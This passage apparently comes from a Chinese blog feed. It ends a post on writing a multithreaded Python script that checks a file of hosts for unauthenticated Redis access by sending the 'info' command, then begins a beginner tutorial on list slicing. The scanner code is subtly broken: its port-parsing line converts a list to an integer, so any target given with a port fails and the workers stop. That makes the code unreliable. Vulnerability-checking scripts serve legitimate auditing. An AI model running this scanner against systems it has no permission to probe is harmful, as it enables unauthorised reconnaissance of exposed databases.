        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> url
        ip <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc
        <span class="token keyword">return</span> ip
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>gaierror<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="处理输入"><a href="#处理输入" class="headerlink" title="处理输入"></a>处理输入</h3><p>我们把要验证漏洞的目标放在一个文件里，每一行为一个目标，现在来编写一个函数，读取文件，将所有目标放到一个队列里，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create_queue</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    创建数据队列
    argument: file_name -> 输入文件名
    return: data,total 数据队列,数据总数
    """</span>
    total <span class="token operator">=</span> <span class="token number">0</span>
    data <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> url<span class="token punctuation">:</span>
            <span class="token comment"># 跳过空白的行</span>
            data<span class="token punctuation">.</span>put<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            total <span class="token operator">+=</span> <span class="token number">1</span>

    data<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>  <span class="token comment"># 结束标记</span>
    <span class="token keyword">return</span> data<span class="token punctuation">,</span>total<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="创建多个线程"><a href="#创建多个线程" class="headerlink" title="创建多个线程"></a>创建多个线程</h3><p>我们的start_jobs函数用于启动多个线程来验证目标，其代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">start_jobs</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    启动所有工作线程
    argument: data -> 数据队列 num -> 线程数
    """</span>
    is_alive <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">]</span>
    <span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""工作线程"""</span>
        <span class="token keyword">while</span> is_alive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                url <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> url <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    <span class="token comment"># 遇到结束标记</span>
                    <span class="token keyword">break</span>
                code<span class="token punctuation">,</span> result <span class="token operator">=</span> poc<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 验证漏洞</span>
                <span class="token keyword">if</span> code<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment"># 存在漏洞</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                is_alive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
        data<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>  <span class="token comment"># 结束标记</span>
                
    jobs <span class="token operator">=</span> <span class="token punctuation">[</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token punctuation">]</span>  <span class="token comment"># 创建多个线程</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
        j<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 启动线程</span>

    <span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
        j<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 等待线程退出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="编写主程序框架"><a href="#编写主程序框架" class="headerlink" title="编写主程序框架"></a>编写主程序框架</h3><p>现在我们需要一个主函数来控制整个流程，代码很简单：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> sys
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Usage: python %s inputFile numOfThread'</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    file_name <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 输入文件</span>
    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 线程数</span>
    data<span class="token punctuation">,</span> total <span class="token operator">=</span> create_queue<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>  <span class="token comment"># 创建数据队列</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'total: %s'</span> <span class="token operator">%</span> total<span class="token punctuation">)</span>
    begin <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    start_jobs<span class="token punctuation">(</span>data<span class="token punctuation">,</span> num<span class="token punctuation">)</span>  <span class="token comment"># 启动工作线程</span>
    end <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'spent %ss'</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>end<span class="token operator">-</span>begin<span class="token punctuation">)</span><span class="token punctuation">)</span>
    

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>现在假设输入文件名为input.txt，脚本文件名为redis_unauth.py，使用16个线程来批量验证漏洞，我们可以启动以下命令：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python redis_unauth.py input.txt <span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>只是一个小脚本，就没必要放到github上了，这里直接贴出，需要的读者可以复制：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/python3</span>

<span class="token triple-quoted-string string">'''
created by feather
'''</span>

<span class="token keyword">import</span> socket
<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread
<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token punctuation">,</span>time
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse

<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url2ip<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 将url转换成ip地址</span>
    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">':'</span> <span class="token keyword">in</span> url <span class="token keyword">else</span> <span class="token number">6379</span> <span class="token comment"># redis默认端口是6379</span>
        host <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        payload <span class="token operator">=</span> <span class="token string">b'*1\r\n$4\r\ninfo\r\n'</span> <span class="token comment"># 发送的数据</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>      
        socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 设置超时时间</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 发送info命令</span>
            response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
            <span class="token keyword">if</span> response <span class="token keyword">and</span> <span class="token string">'redis_version'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'%s:%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">url2ip</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    url转换成ip
    argument: url
    return: 形如www.a.com:80格式的字符串 若转换失败则返回None
    """</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> url
        ip <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc
        <span class="token keyword">return</span> ip
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>gaierror<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

    <span class="token keyword">return</span> <span class="token boolean">None</span>
 
<span class="token keyword">def</span> <span class="token function">create_queue</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    创建数据队列
    argument: file_name -> 输入文件名
    return: data,total 数据队列,数据总数
    """</span>
    total <span class="token operator">=</span> <span class="token number">0</span>
    data <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> url<span class="token punctuation">:</span>
            <span class="token comment"># 跳过空白的行</span>
            data<span class="token punctuation">.</span>put<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            total <span class="token operator">+=</span> <span class="token number">1</span>

    data<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>  <span class="token comment"># 结束标记</span>
    <span class="token keyword">return</span> data<span class="token punctuation">,</span>total

<span class="token keyword">def</span> <span class="token function">start_jobs</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    启动所有工作线程
    argument: data -> 数据队列 num -> 线程数
    """</span>
    is_alive <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">]</span>
    <span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""工作线程"""</span>
        <span class="token keyword">while</span> is_alive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                url <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> url <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    <span class="token comment"># 遇到结束标记</span>
                    <span class="token keyword">break</span>
                code<span class="token punctuation">,</span> result <span class="token operator">=</span> poc<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 验证漏洞</span>
                <span class="token keyword">if</span> code<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment"># 存在漏洞</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                is_alive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
        data<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>  <span class="token comment"># 结束标记</span>
                
    jobs <span class="token operator">=</span> <span class="token punctuation">[</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token punctuation">]</span>  <span class="token comment"># 创建多个线程</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
        j<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 启动线程</span>

    <span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
        j<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 等待线程退出</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> sys
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Usage: python %s inputFile numOfThread'</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    file_name <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 输入文件</span>
    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 线程数</span>
    data<span class="token punctuation">,</span> total <span class="token operator">=</span> create_queue<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>  <span class="token comment"># 创建数据队列</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'total: %s'</span> <span class="token operator">%</span> total<span class="token punctuation">)</span>
    begin <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    start_jobs<span class="token punctuation">(</span>data<span class="token punctuation">,</span> num<span class="token punctuation">)</span>  <span class="token comment"># 启动工作线程</span>
    end <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'spent %ss'</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>end<span class="token operator">-</span>begin<span class="token punctuation">)</span><span class="token punctuation">)</span>
    

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>漏洞</tag>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（五）·列表与元组</title>
    <url>/c5b72709/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在介绍了通用的序列操作后，我们来学习序列类型中的列表和元组</p>
<span id="more"></span>

<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><p>我们已经初步学习了列表，在深入之前，让我们简单回顾一下以往的知识。</p>
<p>创建列表的方法：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 创建空列表</span>
<span class="token operator">>></span><span class="token operator">></span> list_2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建空列表</span>
<span class="token operator">>></span><span class="token operator">></span> list_3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token comment"># 创建带有元素的列表</span>
<span class="token operator">>></span><span class="token operator">></span> list_4 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个列表 ['a','b','c','d']  （这是没学习过的）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>给元素赋值：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 将索引为1的元素赋值为2</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>删除元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上一节我们还学习了分片、相加、乘法等通用序列操作，这里就不过多阐述</p>
<h4 id="分片赋值"><a href="#分片赋值" class="headerlink" title="分片赋值"></a>分片赋值</h4><p>在上一节中，我们介绍了通用的序列分片操作。事实上，列表的分片操作并未在此停下脚步。</p>
<p>对于列表，我们还可以使用分片来批量赋值元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ef'</span><span class="token punctuation">)</span>  <span class="token comment"># 将索引为1和索引为2的元素分别替换成'e'、'f'</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用于替换的序列不必要与原序列等长：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>  <span class="token comment"># list_1[1:3]长度为2，但我们替换的序列长度为3</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果对分片很熟悉，理解下面这个分片操作应该不会有难度：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>截取索引1到索引1（不包括1）的元素，因为第二个索引的元素是不包括在返回的序列中的，而第一个索引的又是这个不应包括的元素，所以返回了空序列。</p>
<p>想象一下，<code>list_1[1:1]</code>这个空序列是索引0和索引1之间的“空隙”，那为什么不是1和2之间呢？因为第二个索引1指定的是分片操作的终点，而分片又不包括终点，所以<code>list_1[1:1]</code>当然是终点索引1之前的空隙了。</p>
<p>说到这里，读者们是否有想到什么清奇的操作呢？ <code>(⊙ˍ⊙)</code></p>
<p>借助这个看似奇怪的逻辑，我们可以插入一个序列 <code>(°ー°〃)</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>对上面的代码，我们可以理解成把一个空序列“替换”成一个新的序列。</p>
<p>既然可以插入，那么批量删除也是可以的：</p>
